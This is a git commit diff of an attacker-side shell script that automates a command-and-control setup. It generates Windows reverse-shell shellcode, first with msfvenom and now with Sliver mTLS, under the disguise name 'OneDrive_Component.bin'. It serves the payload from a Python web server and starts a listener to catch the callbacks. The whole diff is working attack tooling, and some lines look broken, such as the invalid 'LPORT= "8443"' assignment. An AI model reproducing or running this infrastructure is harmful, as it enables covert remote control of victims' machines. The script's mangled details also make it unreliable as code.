438c064a54fbd8270b5762ea1cc40cca813761c9
giuseppe-maglione <giuseppemaglione.mail@gmail.com>
2026-05-20 18:04:49 +0200

    changed c2 framework

--- attacker/start_c2.sh
+++ attacker/start_c2.sh
@@ -1,11 +1,10 @@
 #!/bin/bash
 
 # --- SETUP
-LHOST="192.168.122.235"     # Enter your Kali's IP here
-LPORT="4444"                # everse Shell port
-WEB_PORT="8080"             # Python Web Server port
+LHOST="192.168.122.235"             # enter your Kali's IP here
+LPORT= "8443"                       # enter reverse shell listening port here
+WEB_PORT="8080"                     # python Web Server port
 PAYLOAD_NAME="OneDrive_Component.bin"
-PAYLOAD_TYPE="windows/x64/shell_reverse_tcp"
 
 # get script's absolute directory
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
@@ -19,9 +18,19 @@ echo -e "\e[1;34m[*] Launching Automated C2 Infrastructure   \e[0m"
 echo -e "\e[1;34m[*]=========================================\e[0m"
 
 # 1. GENERATE PAYLOAD
-echo -e "\e[1;33m[*] 1. Generating shellcode with msfvenom...\e[0m"
-msfvenom -p $PAYLOAD_TYPE LHOST=$LHOST LPORT=$LPORT -f raw -o "$WWW_DIR/$PAYLOAD_NAME"
-echo -e "\e[1;32m[+] Payload saved in: $WWW_DIR/$PAYLOAD_NAME\e[0m"
+echo -e "\e[1;33m[*] 1. Generating mTLS shellcode with Sliver...\e[0m"
+
+sliver-server generate -mtls "$LHOST:$LPORT" --os windows --arch amd64 --format shellcode --save "$WWW_DIR"
+
+LATEST_PAYLOAD=$(ls -t "$WWW_DIR"/*.bin 2>/dev/null | head -n 1)
+
+if [ -n "$LATEST_PAYLOAD" ]; then
+    mv "$LATEST_PAYLOAD" "$WWW_DIR/$PAYLOAD_NAME"
+    echo -e "\e[1;32m[+] Payload saved to: $WWW_DIR/$PAYLOAD_NAME\e[0m"
+else
+    echo -e "\e[1;31m[-] Error: Sliver payload generation failed.\e[0m"
+    exit 1
+fi
 
 # 2. START PYTHON WEB SERVER
 echo -e "\e[1;33m[*] 2. Starting Python Web Server on port $WEB_PORT...\e[0m"
@@ -30,13 +39,14 @@ python3 -m http.server $WEB_PORT &
 PYTHON_PID=$!  # save server PID
 echo -e "\e[1;32m[+] Web Server listening on http://$LHOST:$WEB_PORT\e[0m"
 
-# 3. START METASPLOIT LISTENER
-echo -e "\e[1;33m[*] 3. Starting Metasploit Handler...\e[0m"
-echo -e "\e[1;31m[!] Press Ctrl+C or write 'exit' in msfconsole to shut down the infrastructure.\e[0m"
+# 3. START SLIVER LISTENER
+echo -e "\e[1;33m[*] 3. Starting Sliver mTLS Listener on port 8443...\e[0m"
+echo -e "\e[1;31m[!] Executing Sliver C2 Server. Write 'exit' or press Ctrl+C to close.\e[0m"
 cd "$DIR"
 
-# start msfconsole in foreground
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit"
+sliver-server jobs -mtls -p 8443
+
+sliver-server
 
 # CLEANUP
 echo -e "\n\e[1;34m[*] Shutting down the infrastructure...\e[0m"
